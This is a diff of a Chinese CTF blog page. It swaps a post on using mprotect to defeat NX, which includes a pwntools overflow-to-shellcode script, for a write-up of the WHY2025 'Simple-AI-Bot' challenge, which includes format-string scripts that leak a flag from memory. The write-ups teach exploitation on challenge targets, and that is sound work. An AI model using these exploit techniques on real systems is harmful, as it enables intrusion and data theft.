@@ -19,24 +19,25 @@
   <meta name="author" content="">
   <meta name="keywords" content="">
   
-    <meta name="description" content="题目简介题目背景见正常exit问题">
+    <meta name="description" content="题目简介2025年8月9日的WHY2025 CTF赛题，链接在这WHY2025 CTF: Simple-AI-Bot">
 <meta property="og:type" content="article">
-<meta property="og:title" content="mprotect技巧">
-<meta property="og:url" content="http://0x4a-210.github.io/2025/08/08/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/index.html">
+<meta property="og:title" content="2025.08.09-Simple-AI-Bot">
+<meta property="og:url" content="http://0x4a-210.github.io/2025/08/11/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025-08-09-Simple-AI-Bot/index.html">
 <meta property="og:site_name" content="0x4A">
-<meta property="og:description" content="题目简介题目背景见正常exit问题">
+<meta property="og:description" content="题目简介2025年8月9日的WHY2025 CTF赛题，链接在这WHY2025 CTF: Simple-AI-Bot">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/file.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/IDA-find_mprotect.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/vmmap.png">
-<meta property="article:published_time" content="2025-08-08T09:08:32.000Z">
-<meta property="article:modified_time" content="2025-08-09T04:26:58.701Z">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/flag-prompt.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/fmt-test.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/offset.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/NULL-Byte-Error.png">
+<meta property="article:published_time" content="2025-08-11T09:16:59.000Z">
+<meta property="article:modified_time" content="2025-08-12T02:24:43.401Z">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/file.png">
+<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/flag-prompt.png">
   
   
   
-  <title>mprotect技巧 - 0x4A</title>
+  <title>2025.08.09-Simple-AI-Bot - 0x4A</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -190,7 +191,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="mprotect技巧"></span>
+            <span id="subtitle" data-typed-text="2025.08.09-Simple-AI-Bot"></span>
           
         </div>
 
@@ -201,8 +202,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-08-08 17:08" pubdate>
-          August 8, 2025 pm
+        <time datetime="2025-08-11 17:16" pubdate>
+          August 11, 2025 pm
         </time>
       </span>
     
@@ -213,7 +214,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          695 words
+          642 words
         
       </span>
     
@@ -261,18 +262,19 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">mprotect技巧</h1>
+            <h1 id="seo-header">2025.08.09-Simple-AI-Bot</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>题目背景见<a href="https://0x4a-210.github.io/2025/08/07/Questions/%E6%AD%A3%E5%B8%B8exit%E9%97%AE%E9%A2%98/">正常exit问题</a><br></p>
+                <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>2025年8月9日的WHY2025 CTF赛题，链接在这<a target="_blank" rel="noopener" href="https://ctf.why2025.org/challenges">WHY2025 CTF: Simple-AI-Bot</a><br></p>
 <span id="more"></span>
-<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>常规的分析不再赘述，这里主要记录一下这道题的另一个解法，也是一个NX保护开启情况下依然可以ret2shellcode的技巧<br><br>从上述链接的分析中可以看到程序开启了NX保护，按照常理来说基本不可能采用ret2shellcode的解法<br><br>但是发现这是一个静态编译的文件：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/file.png" srcset="/img/loading.gif" lazyload><br>这里就想到大概率有mprotect函数，果不其然在IDA的Exports表里搜索到了mprotect函数，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/IDA-find_mprotect.png" srcset="/img/loading.gif" lazyload><br>因此可以使用该函数破坏NX的保护，完成ret2shellcode<br><br>mprotect函数原理详见<a href="https://0x4a-210.github.io/2025/07/19/TogetherReview/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%BB%E7%BB%93/#%E5%85%8B%E5%88%B6NX%E4%BF%9D%E6%8A%A4%E2%80%94%E2%80%94mprotect%E5%87%BD%E6%95%B0">二进制总结：mprotect技巧</a><br><br>同时在上述链接给出的分析里我们可以找到gets函数作为输入<br><br>因此该方法中的漏洞点利用思路为：溢出劫持返回地址–&gt;调用mprotect函数–&gt;调用gets函数将shellcode读入指定内存区段–&gt;最后返回到该内存段<br></p>
-<h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先使用vmmap查看一下程序有哪些内存段：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/vmmap.png" srcset="/img/loading.gif" lazyload><br>内存段的选取其实是任意的，只要是数据段即可（其实代码段也行，但害怕把某些重要指令破坏导致程序趋势……），总之最后我选择在0x80ec000处开始写入shellcode<br><br>接下来确定mprotect的地址，从Exports导出表里面可以看到该函数在0x806ec80<br><br>然后找到gets函数位置，可以通过readelf命令行工具寻找，这里就不贴图了，最后找到gets是在0x804f630<br><br>综上，可以写出如下的利用脚本：<br></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>elf=ELF(targetELF)<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br>LOCAL=<span class="hljs-number">1</span><br>REMOTE=<span class="hljs-number">2</span><br>DEBUG=<span class="hljs-number">3</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        ioTube=process(targetELF)<br>        <span class="hljs-keyword">return</span> ioTube<br>    <span class="hljs-keyword">elif</span> mode==REMOTE:<br>        ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26685</span>)<br>        <span class="hljs-keyword">return</span> ioTube<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        ioTube=gdb.debug(targetELF,<span class="hljs-string">&quot;b *0x8048a40&quot;</span>)<br>        <span class="hljs-keyword">return</span> ioTube<br>    <span class="hljs-keyword">else</span>:<br>        ioTube=process(targetELF)<br>        <span class="hljs-keyword">return</span> ioTube<br><br>offset=<span class="hljs-number">56</span><br>mprotectAddr=<span class="hljs-number">0x806ec80</span>  <span class="hljs-comment">#mprotect函数地址</span><br>readShellcodeAddr=<span class="hljs-number">0x804f630</span>  <span class="hljs-comment">#gets函数地址</span><br>shellcodeStart=<span class="hljs-number">0x80ec000</span>      <span class="hljs-comment">#写shellcode的数据段，任意选</span><br>shellcode=asm(shellcraft.sh())<br><br>pop3_ret1=<span class="hljs-number">0x80509a5</span>    <span class="hljs-comment"># 3个pop，1个ret</span><br><br><span class="hljs-comment">#payload1=b&#x27;a&#x27;*offset+p32(mprotectAddr)+p32(pop3_ret1)+p32(shellcodeStart)+p32(0x1000)+p32(7)+p32(readShellcodeAddr)+p32(shellcodeStart)+p32(shellcodeStart)</span><br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(readShellcodeAddr)+p32(mprotectAddr)+p32(shellcodeStart)+p32(shellcodeStart)+p32(<span class="hljs-number">0x1000</span>)+p32(<span class="hljs-number">7</span>)<br><br>ioTube=Lauch(REMOTE)<br>ioTube.sendline(payload2)<br>ioTube.sendline(shellcode)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>
-<p>最后说一下这里的参数布置问题，需要一个比较巧妙的布置方法，payload2中的第一个p32(shellcodeStart)既是readShellcodeAddr，即gets函数的参数，又是mprotect函数调用完后，下一个需要跳转到的地址<br><br>同时，payload1和payload2是等价的，不过payload1采用先用mprotect函数赋权的策略，因此需要一段3个pop1个ret的gadget去把mprotect的参数pop走<br><br>更具体的关于32位程序下参数布置的细节，详见<a href="https://0x4a-210.github.io/2025/07/19/TogetherReview/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%BB%E7%BB%93/#32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E4%BC%A0%E5%8F%82%E9%97%AE%E9%A2%98">二进制总结：32位程序传参问题</a></p>
-
+<p>个人觉得很难的一道题目，需要盲打，一开始完全没思路……</p>
+<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先拿到题目，发现没有任何附件，需要盲打，这里就卡住了，后来队友提示需要利用格式化字符串漏洞+有一个flag交互选项才知道怎么做<br><br>具体来说，首先监听给的端口，如图，注意到（其实就是瞎猜，我愿称我哥们为拉马努金……）输入包含flag的字符串就可以让机器人返回flag的地址：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/flag-prompt.png" srcset="/img/loading.gif" lazyload><br>接下来既然我的拉马努金队友说了是格式化字符串，那就用%p测试一下，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/fmt-test.png" srcset="/img/loading.gif" lazyload><br>可以看到会输出一些0x巴拉巴拉的地址，说明存在格式化字符串漏洞<br><br>经过上述分（瞎）析（猜），可以确定漏洞点即 <em><strong>泄露flag存储位置+格式化字符串输出</strong></em> 这一思路<br></p>
+<h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定输入的内容在printf时是位于第几个参数，如图，通过tag%p%p%p……%p来确定：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/offset.png" srcset="/img/loading.gif" lazyload><br>然后肉眼数一下有几个0x，发现到输入的1序列（即0x31）有6个0x，因此输入最终会被放在第6个参数<br><br>然后写出如下的利用脚本：<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br>ioTube=remote(<span class="hljs-string">&quot;simple-ai-bot.ctf.zone&quot;</span>,<span class="hljs-number">4242</span>)<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;Hi, what can I help you with today?\n&gt; &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">&quot;flag&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;The flag is safely stored in 0x&quot;</span>)<br>flagAddr=<span class="hljs-built_in">int</span>(ioTube.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ioTube.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><br>ioTube.sendline(p64(flagAddr)+<span class="hljs-string">b&quot;%6$s&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;I&#x27;m sorry, I don&#x27;t know about: &quot;</span>)<br>flag=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag is here:&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br></code></pre></td></tr></table></figure>
+<p>但是，这个exp并不能打通，原因是没有注意到NULL字节会截断printf的格式化字符串，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025.08.09-Simple-AI-Bot/NULL-Byte-Error.png" srcset="/img/loading.gif" lazyload><br>可以看到泄露的地址只有6个字节，p64打包时会引入0字节，导致后面的%6$s不会被printf识别，因此要把格式字符放在前面，不过这样的话偏移要+1变成7，如下：<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br>ioTube=remote(<span class="hljs-string">&quot;simple-ai-bot.ctf.zone&quot;</span>,<span class="hljs-number">4242</span>)<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;Hi, what can I help you with today?\n&gt; &quot;</span>)<br>ioTube.sendline(<span class="hljs-string">&quot;flag&quot;</span>)<br>ioTube.recvuntil(<span class="hljs-string">&quot;The flag is safely stored in 0x&quot;</span>)<br>flagAddr=<span class="hljs-built_in">int</span>(ioTube.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ioTube.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><br>ioTube.sendline(<span class="hljs-string">b&quot;%7$s&quot;</span>+<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">4</span>+p64(flagAddr))<br>ioTube.recvuntil(<span class="hljs-string">&quot;I&#x27;m sorry, I don&#x27;t know about: &quot;</span>)<br>flag=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag is here:&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -295,7 +297,7 @@
   
     <span>></span>
     
-  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/" class="category-chain-item">其他技巧类</a>
+  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" class="category-chain-item">格式化字符串</a>
   
   
 
@@ -317,15 +319,15 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>mprotect技巧</div>
-      <div>http://0x4a-210.github.io/2025/08/08/pwn刷题记录/其他技巧类/mprotect技巧/</div>
+      <div>2025.08.09-Simple-AI-Bot</div>
+      <div>http://0x4a-210.github.io/2025/08/11/pwn刷题记录/格式化字符串/2025-08-09-Simple-AI-Bot/</div>
     </div>
     <div class="license-meta">
       
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 8, 2025</div>
+          <div>August 11, 2025</div>
         </div>
       
       
@@ -357,9 +359,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/08/11/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2025-08-09-Simple-AI-Bot/" title="2025.08.09-Simple-AI-Bot">
+                      <a href="/2025/08/11/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%5DPWN5/" title="\[第五空间2019 决赛\]PWN5">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">2025.08.09-Simple-AI-Bot</span>
+                        <span class="hidden-mobile">\[第五空间2019 决赛\]PWN5</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -367,8 +369,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/08/07/Questions/%E6%AD%A3%E5%B8%B8exit%E9%97%AE%E9%A2%98/" title="正常exit问题">
-                        <span class="hidden-mobile">正常exit问题</span>
+                      <a href="/2025/08/08/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/" title="mprotect技巧">
+                        <span class="hidden-mobile">mprotect技巧</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
